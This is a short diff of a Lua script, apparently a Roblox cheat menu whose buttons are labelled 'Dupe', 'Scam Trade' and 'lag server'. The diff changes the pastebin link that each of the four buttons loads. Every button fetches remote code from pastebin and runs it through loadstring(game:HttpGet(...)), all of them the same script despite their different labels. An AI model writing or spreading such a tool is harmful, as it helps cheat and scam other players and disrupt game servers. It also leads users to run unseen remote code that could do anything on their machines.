@@ -6,17 +6,17 @@ local Tab1 = GUI:Tap("Dupe")
 local Tab2 = GUI:Tap("Trade scam")
 
 Tab1:Button("Dupe",function()
-   loadstring(game:HttpGet("https://pastebin.com/raw/qdtsuXzG"))()
+   loadstring(game:HttpGet("https://pastebin.com/raw/uqK2ShRK"))()
 end)
 
 Tab2:Button("Scam Trade",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/qdtsuXzG"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/uqK2ShRK"))()
 end)
 
 Tab2:Button("lag server",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/qdtsuXzG"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/uqK2ShRK"))()
 end)
 
 Tab1:Button("lag server",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/qdtsuXzG"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/uqK2ShRK"))()
 end)
